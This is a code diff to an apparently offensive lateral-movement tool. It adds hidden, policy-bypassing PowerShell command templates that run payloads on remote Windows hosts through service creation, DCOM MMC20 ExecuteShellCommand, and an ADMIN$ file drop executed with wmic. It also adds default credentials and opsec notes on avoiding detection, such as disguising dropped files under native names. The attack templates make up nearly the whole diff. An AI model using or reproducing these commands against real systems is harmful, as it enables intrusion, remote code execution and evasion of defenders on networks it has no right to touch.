@@ -60,10 +60,52 @@ KINDS: dict[str, dict[str, str]] = {
         "telemetry": "5136, sysmon:13",
         "opsec": "gpo push is loud and persistent — only with an explicit objective",
     },
+    "service": {
+        "command": (
+            "powershell -w h -nop -ep bypass -c \""
+            "sc.exe \\\\{host} create '{value}' binPath= '{payload}' start= demand;"
+            "sc.exe \\\\{host} start '{value}'\""
+        ),
+        "mitre": "T1021",
+        "telemetry": "7045 (remote), 5145 (ADMIN$ pipe), sysmon:1 on target",
+        "opsec": "needs SYSTEM-local admin and an ADMIN$ share — svc create is heavily flagged",
+    },
+    "dcom": {
+        "command": (
+            "powershell -w h -nop -ep bypass -c \""
+            "$c=[activator]::CreateInstance([type]::GetTypeFromProgID("
+            "'MMC20.Application','{host}'));"
+            "$c.Document.ActiveView.ExecuteShellCommand("
+            "'C:\\Windows\\System32\\cmd.exe',$null,'/c {payload}','7')\""
+        ),
+        "mitre": "T1021.003",
+        "telemetry": "DCOM activation 135, 4688 on target, sysmon:1",
+        "opsec": "no visible service on the wire — most times zero file io; watch 135/conn",
+    },
+    "shares": {
+        "command": (
+            "powershell -w h -nop -ep bypass -c \""
+            "New-SmbMapping -RemotePath \\\\{host}\\ADMIN$ -Credential "
+            "(New-Object PSCredential('{domain}\\{user}', "
+            "(ConvertTo-SecureString '{password}' -AsPlainText -Force)));"
+            "Copy-Item .\\sc.exe \\\\{host}\\ADMIN$\\sc_drop.exe;"
+            "wmic /node:{host} process call create '\\sc_drop.exe {payload}'\""
+        ),
+        "mitre": "T1021.002",
+        "telemetry": "5140/5145 with FILE WRITE on ADMIN$, 4688 remote",
+        "opsec": "atypical admin$ write is a top pivot detection — drop with a native name",
+    },
 }
 
 
 def command(kind: str, host: str, **values: str) -> dict[str, str]:
+    """Same defaults the CLI pads in — a bare keyword render must not fail."""
+    values.setdefault("user", "Administrator")
+    values.setdefault("password", "Password123!")
+    values.setdefault("domain", "CORP")
+    values.setdefault("value", "Updater")
+    values.setdefault("gpo", "Workstation Policy")
+    values.setdefault("schedule_id", "{00000000-0000-0000-0000-000000000001}")
     spec = KINDS.get(kind)
     if spec is None:
         raise KeyError(f"unknown lateral kind: {kind}")
